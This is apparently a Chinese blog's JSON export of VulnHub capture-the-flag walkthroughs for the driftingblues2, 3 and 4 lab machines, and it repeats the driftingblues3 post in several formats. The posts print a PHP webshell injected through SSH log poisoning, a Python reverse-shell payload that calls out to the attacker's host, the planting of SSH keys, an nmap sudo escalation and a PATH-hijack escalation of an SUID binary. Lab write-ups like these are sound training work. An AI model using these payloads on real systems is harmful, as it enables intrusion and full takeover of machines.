Shell\"></a>Get Shell</h3><p>通过修改主题的404.php来反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png\"></p>\n<p>修改后先开启一个监听端口来接受shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png\"></p>\n<p>访问404.php成功反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png\"></p>\n<p>靶机有python环境，可以获取一个交互式的shell</p>\n<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png\"></p>\n<p>进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录</p>\n<p><img src=\"https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png\"></p>\n<pre><code>ssh freddie@192.168.62.171 -i id_rsa\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png\"></p>\n<p>得到第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p><img src=\"https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png\"></p>\n<p>可以看出来，接下来需要用nmap提权</p>\n<pre><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png\"></p>\n<p>执行完获得root权限，但此时是看不到输入的，接着执行</p>\n<pre><code>reset\n</code></pre>\n<p>这时就可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n<p>所以，一开始获取的图片还是没用上</p>\n"},{"title":"driftingblues3 VulnHub Walkthrough","date":"2021-10-13T09:09:41.000Z","_content":"\n### 信息收集\n\n#### 主机发现\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.173 \n```\n\n![](https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png)\n\n只开放了22和80端口，先访问80端口看看\n\n![](https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png)\n\n好像没有什么信息，扫一下目录\n\n```\ndirsearch -u http://192.168.62.173/\n```\n\n![](https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png)\n\n有点奇怪，逐个看了一下，好像都是没用的信息\n\n![](https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png)\n\n再看看robots.txt，是唯一有用的路径\n\n![](https://i.loli.net/2021/10/13/Z97ixT5SKCVjzuy.png)\n\n接着访问一下\n\n![](https://i.loli.net/2021/10/13/RnyvEz1OImLurMZ.png)\n\nemmm再接再厉，继续访问\n\n![](https://i.loli.net/2021/10/13/dWAkgJ5BQLy81OI.png)\n\n好像是诗歌还是歌词，目前没有什么信息，查看一下源码\n\n![](https://i.loli.net/2021/10/13/hV3pdTlWcbvkABE.png)\n\nbase64编码，到在线网站转换一下\n\n<img src=\"https://i.loli.net/2021/10/13/8EgkBodRq1YjAOH.png\" style=\"zoom: 67%;\" />\n\n哎，还要再转换一次\n\n<img src=\"https://i.loli.net/2021/10/13/KC1QoRcmuTqG4fE.png\" style=\"zoom:67%;\" />\n\n提示了一个php文件，去访问一下\n\n![](https://i.loli.net/2021/10/13/JPCuhSeUZXnOkRq.png)\n\n### 漏洞发现\n\n这个php文件是应该ssh登录日志，先随便尝试一下登录，看会不会有记录\n\n![](https://i.loli.net/2021/10/13/nFKbN5to2rTjSHa.png)\n\n可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell\n\n![](https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png)\n\n### 漏洞利用&getshell\n\n以php的webshell作为用户名来登录ssh\n\n```\nssh '<?php system($_GET[\"cmd\"]);?>'@192.168.62.173\n```\n\n![](https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png)\n\n看一下效果，看到已经可以执行命令了\n\n![](https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png)\n\n#### 反弹shell\n\n先看一下有没有python环境\n\n![](https://i.loli.net/2021/10/13/JajMB9ytKZoHbur.png)\n\n可以看到，靶机是有python3环境的，那就试试python来反弹shell\n\n先开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png)\n\n访问一下\n\n```\nhttp://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27\n```\n\n在本机已经接收到了shell\n\n![](https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png)\n\n#### SSH登录\n\n进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录\n\n先在本地生成公私钥\n\n```\nssh-keygen\t#一直回默认就可以\n```\n\n<img src=\"https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png\" style=\"zoom:80%;\" />\n\n进入本地ssh目录，查看一下id_rsa.pub\n\n![](https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png)\n\n将id_rsa.pub的内容复制到authorized_keys\n\n```\ncat id_rsa.pub >> authorized_keys\n```\n\n然后上传到靶机的ssh目录，先在本机用python开启一个http服务\n\n```\npython3 -m http.server 80\n```\n\n![](https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png)\n\n到靶机的ssh目录通过wget下载\n\n```\nwget http://192.168.62.134/authorized_keys\n```\n\n![](https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png)\n\n现在可以实现ssh免密登录了\n\n![](https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png)\n\n先获取第一个flag\n\n<img src=\"https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png\" style=\"zoom:67%;\" />\n\n### 权限提升\n\n先看一下具有suid的可执行文件\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n![](https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png)\n\n看到有一个getinfo命令，先执行一下看看\n\n<img src=\"https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png\"  />\n\n看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令\n\n那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件\n\n这里我在tmp目录新建一个文件ip，并赋予执行权限\n\n```\necho \"/bin/bash\" > /tmp/ip\nchmod +x /tmp/ip\n```\n\n![](https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png)\n\n最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了\n\n```\nexport PATH=/tmp:$PATH\n/usr/bin/getinfo\n```\n\n![](https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png)\n\n现在可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png\" style=\"zoom:67%;\" />\n\n","source":"_posts/driftingblues3-VulnHub-Walkthrough.md","raw":"---\ntitle: driftingblues3 VulnHub Walkthrough\ndate: 2021-10-13 17:09:41\ncategories:\n- 渗透测试\ntags:\n- VulnHub\n---\n\n### 信息收集\n\n#### 主机发现\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.173 \n```\n\n![](https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png)\n\n只开放了22和80端口，先访问80端口看看\n\n![](https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png)\n\n好像没有什么信息，扫一下目录\n\n```\ndirsearch -u http://192.168.62.173/\n```\n\n![](https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png)\n\n有点奇怪，逐个看了一下，好像都是没用的信息\n\n![](https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png)\n\n再看看robots.txt，是唯一有用的路径\n\n![](https://i.loli.net/2021/10/13/Z97ixT5SKCVjzuy.png)\n\n接着访问一下\n\n![](https://i.loli.net/2021/10/13/RnyvEz1OImLurMZ.png)\n\nemmm再接再厉，继续访问\n\n![](https://i.loli.net/2021/10/13/dWAkgJ5BQLy81OI.png)\n\n好像是诗歌还是歌词，目前没有什么信息，查看一下源码\n\n![](https://i.loli.net/2021/10/13/hV3pdTlWcbvkABE.png)\n\nbase64编码，到在线网站转换一下\n\n<img src=\"https://i.loli.net/2021/10/13/8EgkBodRq1YjAOH.png\" style=\"zoom: 67%;\" />\n\n哎，还要再转换一次\n\n<img src=\"https://i.loli.net/2021/10/13/KC1QoRcmuTqG4fE.png\" style=\"zoom:67%;\" />\n\n提示了一个php文件，去访问一下\n\n![](https://i.loli.net/2021/10/13/JPCuhSeUZXnOkRq.png)\n\n### 漏洞发现\n\n这个php文件是应该ssh登录日志，先随便尝试一下登录，看会不会有记录\n\n![](https://i.loli.net/2021/10/13/nFKbN5to2rTjSHa.png)\n\n可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell\n\n![](https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png)\n\n### 漏洞利用&getshell\n\n以php的webshell作为用户名来登录ssh\n\n```\nssh '<?php system($_GET[\"cmd\"]);?>'@192.168.62.173\n```\n\n![](https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png)\n\n看一下效果，看到已经可以执行命令了\n\n![](https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png)\n\n#### 反弹shell\n\n先看一下有没有python环境\n\n![](https://i.loli.net/2021/10/13/JajMB9ytKZoHbur.png)\n\n可以看到，靶机是有python3环境的，那就试试python来反弹shell\n\n先开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png)\n\n访问一下\n\n```\nhttp://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27\n```\n\n在本机已经接收到了shell\n\n![](https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png)\n\n#### SSH登录\n\n进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录\n\n先在本地生成公私钥\n\n```\nssh-keygen\t#一直回默认就可以\n```\n\n<img src=\"https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png\" style=\"zoom:80%;\" />\n\n进入本地ssh目录，查看一下id_rsa.pub\n\n![](https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png)\n\n将id_rsa.pub的内容复制到authorized_keys\n\n```\ncat id_rsa.pub >> authorized_keys\n```\n\n然后上传到靶机的ssh目录，先在本机用python开启一个http服务\n\n```\npython3 -m http.server 80\n```\n\n![](https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png)\n\n到靶机的ssh目录通过wget下载\n\n```\nwget http://192.168.62.134/authorized_keys\n```\n\n![](https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png)\n\n现在可以实现ssh免密登录了\n\n![](https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png)\n\n先获取第一个flag\n\n<img src=\"https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png\" style=\"zoom:67%;\" />\n\n### 权限提升\n\n先看一下具有suid的可执行文件\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n![](https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png)\n\n看到有一个getinfo命令，先执行一下看看\n\n<img src=\"https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png\"  />\n\n看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令\n\n那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件\n\n这里我在tmp目录新建一个文件ip，并赋予执行权限\n\n```\necho \"/bin/bash\" > /tmp/ip\nchmod +x /tmp/ip\n```\n\n![](https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png)\n\n最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了\n\n```\nexport PATH=/tmp:$PATH\n/usr/bin/getinfo\n```\n\n![](https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png)\n\n现在可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png\" style=\"zoom:67%;\" />\n\n","slug":"driftingblues3-VulnHub-Walkthrough","published":1,"updated":"2021-12-25T12:19:50.096Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyj000swku176xqgice","content":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.173 \n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png\"></p>\n<p>只开放了22和80端口，先访问80端口看看</p>\n<p><img src=\"https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png\"></p>\n<p>好像没有什么信息，扫一下目录</p>\n<pre><code>dirsearch -u http://192.168.62.173/\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png\"></p>\n<p>有点奇怪，逐个看了一下，好像都是没用的信息</p>\n<p><img src=\"https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png\"></p>\n<p>再看看robots.txt，是唯一有用的路径</p>\n<p><img src=\"https://i.loli.net/2021/10/13/Z97ixT5SKCVjzuy.png\"></p>\n<p>接着访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/13/RnyvEz1OImLurMZ.png\"></p>\n<p>emmm再接再厉，继续访问</p>\n<p><img src=\"https://i.loli.net/2021/10/13/dWAkgJ5BQLy81OI.png\"></p>\n<p>好像是诗歌还是歌词，目前没有什么信息，查看一下源码</p>\n<p><img src=\"https://i.loli.net/2021/10/13/hV3pdTlWcbvkABE.png\"></p>\n<p>base64编码，到在线网站转换一下</p>\n<img src=\"https://i.loli.net/2021/10/13/8EgkBodRq1YjAOH.png\" style=\"zoom: 67%;\" />\n\n<p>哎，还要再转换一次</p>\n<img src=\"https://i.loli.net/2021/10/13/KC1QoRcmuTqG4fE.png\" style=\"zoom:67%;\" />\n\n<p>提示了一个php文件，去访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/13/JPCuhSeUZXnOkRq.png\"></p>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><p>这个php文件是应该ssh登录日志，先随便尝试一下登录，看会不会有记录</p>\n<p><img src=\"https://i.loli.net/2021/10/13/nFKbN5to2rTjSHa.png\"></p>\n<p>可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell</p>\n<p><img src=\"https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png\"></p>\n<h3 id=\"漏洞利用-amp-getshell\"><a href=\"#漏洞利用-amp-getshell\" class=\"headerlink\" title=\"漏洞利用&amp;getshell\"></a>漏洞利用&amp;getshell</h3><p>以php的webshell作为用户名来登录ssh</p>\n<pre><code>ssh &#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;@192.168.62.173\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png\"></p>\n<p>看一下效果，看到已经可以执行命令了</p>\n<p><img src=\"https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png\"></p>\n<h4 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h4><p>先看一下有没有python环境</p>\n<p><img src=\"https://i.loli.net/2021/10/13/JajMB9ytKZoHbur.png\"></p>\n<p>可以看到，靶机是有python3环境的，那就试试python来反弹shell</p>\n<p>先开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png\"></p>\n<p>访问一下</p>\n<pre><code>http://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27\n</code></pre>\n<p>在本机已经接收到了shell</p>\n<p><img src=\"https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png\"></p>\n<h4 id=\"SSH登录\"><a href=\"#SSH登录\" class=\"headerlink\" title=\"SSH登录\"></a>SSH登录</h4><p>进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录</p>\n<p>先在本地生成公私钥</p>\n<pre><code>ssh-keygen    #一直回默认就可以\n</code></pre>\n<img src=\"https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png\" style=\"zoom:80%;\" />\n\n<p>进入本地ssh目录，查看一下id_rsa.pub</p>\n<p><img src=\"https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png\"></p>\n<p>将id_rsa.pub的内容复制到authorized_keys</p>\n<pre><code>cat id_rsa.pub &gt;&gt; authorized_keys\n</code></pre>\n<p>然后上传到靶机的ssh目录，先在本机用python开启一个http服务</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png\"></p>\n<p>到靶机的ssh目录通过wget下载</p>\n<pre><code>wget http://192.168.62.134/authorized_keys\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png\"></p>\n<p>现在可以实现ssh免密登录了</p>\n<p><img src=\"https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png\"></p>\n<p>先获取第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png\" style=\"zoom:67%;\" />\n\n<h3 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h3><p>先看一下具有suid的可执行文件</p>\n<pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png\"></p>\n<p>看到有一个getinfo命令，先执行一下看看</p>\n<img src=\"https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png\"  />\n\n<p>看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令</p>\n<p>那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件</p>\n<p>这里我在tmp目录新建一个文件ip，并赋予执行权限</p>\n<pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/ip\nchmod +x /tmp/ip\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png\"></p>\n<p>最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了</p>\n<pre><code>export PATH=/tmp:$PATH\n/usr/bin/getinfo\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png\"></p>\n<p>现在可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png\" style=\"zoom:67%;\" />\n\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.173 \n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png\"></p>\n<p>只开放了22和80端口，先访问80端口看看</p>\n<p><img src=\"https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png\"></p>\n<p>好像没有什么信息，扫一下目录</p>\n<pre><code>dirsearch -u http://192.168.62.173/\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png\"></p>\n<p>有点奇怪，逐个看了一下，好像都是没用的信息</p>\n<p><img src=\"https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png\"></p>\n<p>再看看robots.txt，是唯一有用的路径</p>\n<p><img src=\"https://i.loli.net/2021/10/13/Z97ixT5SKCVjzuy.png\"></p>\n<p>接着访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/13/RnyvEz1OImLurMZ.png\"></p>\n<p>emmm再接再厉，继续访问</p>\n<p><img src=\"https://i.loli.net/2021/10/13/dWAkgJ5BQLy81OI.png\"></p>\n<p>好像是诗歌还是歌词，目前没有什么信息，查看一下源码</p>\n<p><img src=\"https://i.loli.net/2021/10/13/hV3pdTlWcbvkABE.png\"></p>\n<p>base64编码，到在线网站转换一下</p>\n<img src=\"https://i.loli.net/2021/10/13/8EgkBodRq1YjAOH.png\" style=\"zoom: 67%;\" />\n\n<p>哎，还要再转换一次</p>\n<img src=\"https://i.loli.net/2021/10/13/KC1QoRcmuTqG4fE.png\" style=\"zoom:67%;\" />\n\n<p>提示了一个php文件，去访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/13/JPCuhSeUZXnOkRq.png\"></p>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><p>这个php文件是应该ssh登录日志，先随便尝试一下登录，看会不会有记录</p>\n<p><img src=\"https://i.loli.net/2021/10/13/nFKbN5to2rTjSHa.png\"></p>\n<p>可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell</p>\n<p><img src=\"https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png\"></p>\n<h3 id=\"漏洞利用-amp-getshell\"><a href=\"#漏洞利用-amp-getshell\" class=\"headerlink\" title=\"漏洞利用&amp;getshell\"></a>漏洞利用&amp;getshell</h3><p>以php的webshell作为用户名来登录ssh</p>\n<pre><code>ssh &#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;@192.168.62.173\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png\"></p>\n<p>看一下效果，看到已经可以执行命令了</p>\n<p><img src=\"https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png\"></p>\n<h4 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h4><p>先看一下有没有python环境</p>\n<p><img src=\"https://i.loli.net/2021/10/13/JajMB9ytKZoHbur.png\"></p>\n<p>可以看到，靶机是有python3环境的，那就试试python来反弹shell</p>\n<p>先开启一个监听端口来接收反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png\"></p>\n<p>访问一下</p>\n<pre><code>http://192.168.62.173/adminsfixit.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.62.134%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27\n</code></pre>\n<p>在本机已经接收到了shell</p>\n<p><img src=\"https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png\"></p>\n<h4 id=\"SSH登录\"><a href=\"#SSH登录\" class=\"headerlink\" title=\"SSH登录\"></a>SSH登录</h4><p>进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录</p>\n<p>先在本地生成公私钥</p>\n<pre><code>ssh-keygen    #一直回默认就可以\n</code></pre>\n<img src=\"https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png\" style=\"zoom:80%;\" />\n\n<p>进入本地ssh目录，查看一下id_rsa.pub</p>\n<p><img src=\"https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png\"></p>\n<p>将id_rsa.pub的内容复制到authorized_keys</p>\n<pre><code>cat id_rsa.pub &gt;&gt; authorized_keys\n</code></pre>\n<p>然后上传到靶机的ssh目录，先在本机用python开启一个http服务</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png\"></p>\n<p>到靶机的ssh目录通过wget下载</p>\n<pre><code>wget http://192.168.62.134/authorized_keys\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png\"></p>\n<p>现在可以实现ssh免密登录了</p>\n<p><img src=\"https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png\"></p>\n<p>先获取第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png\" style=\"zoom:67%;\" />\n\n<h3 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h3><p>先看一下具有suid的可执行文件</p>\n<pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png\"></p>\n<p>看到有一个getinfo命令，先执行一下看看</p>\n<img src=\"https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png\"  />\n\n<p>看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令</p>\n<p>那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件</p>\n<p>这里我在tmp目录新建一个文件ip，并赋予执行权限</p>\n<pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/ip\nchmod +x /tmp/ip\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png\"></p>\n<p>最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了</p>\n<pre><code>export PATH=/tmp:$PATH\n/usr/bin/getinfo\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png\"></p>\n<p>现在可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png\" style=\"zoom:67%;\" />\n\n"},{"title":"driftingblues4 VulnHub Walkthrough","date":"2021-10-14T07:49:32.000Z","_content":"\n#### 主机发现\n\n```\narp-scan -l\n```\n\n<img src=\"https://i.loli.net/2021/10/14/zhRLGB6DEPml2uv.png\" style=\"zoom:67%;\" />\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.174\n```\n\n<img src=\"https://i.loli.net/2021/10/14/zLTuWXdBhYVneoM.png\" style=\"zoom: 67%;\" />\n\n开放了21、22、80端口，先看了下21端口，发现需要密码\n\n<img src=\"https://i.loli.net/2021/10/14/eoD7OHbsxQdl945.png\" style=\"zoom:67%;\" />\n\n再访问一下80端口，看看有没有什么信息\n\n![](https://i.loli.net/2021/10/14/RutLqmjfi95sKAS.png)\n\n#### 信息收集\n\n主页没有什么信息，看一下源码\n\n![](https://i.loli.net/2021/10/14/y43jOYEQP1Wtmrz.png)\n\nbase64编码，到在线网站转换一下\n\n<img src=\"https://i.loli.net/2021/10/14/iPnKaR3Hxc45Q9r.png\" style=\"zoom:50%;\" />\n\n再转换一次\n\n<img src=\"https://i.loli.net/2021/10/14/ITbCv2kKSmcjZhH.png\" style=\"zoom:50%;\" />\n\nemmm，继续\n\n<img src=\"https://i.loli.net/2021/10/14/bLqOkQABpI4UN6v.png\" style=\"zoom:50%;\" />\n\n<img src=\"https://i.loli.net/2021/10/14/KkXxDfubgw8l7BE.png\" style=\"zoom:50%;\" />\n\n最后得到一个txt的路径，访问一下\n\n<img src=\"https://i.loli.net/2021/10/14/sLfinMZNFSBem8y.png\" style=\"zoom: 67%;\" />\n\nBrainfuck加密，到在线网站解密一下\n\n![](https://i.loli.net/2021/10/14/k8BNGWeDhpK4HcX.png)\n\n得到了一张图片的路径，访问一下\n\n是一个二维码\n\n<img src=\"https://i.loli.net/2021/10/14/S1lyGvhiRO5VoWk.png\" style=\"zoom: 33%;\" />\n\n扫描的结果是一张图片地址\n\n<img src=\"https://i.loli.net/2021/10/14/ri9wbhBXtmn21Wv.png\" style=\"zoom:80%;\" 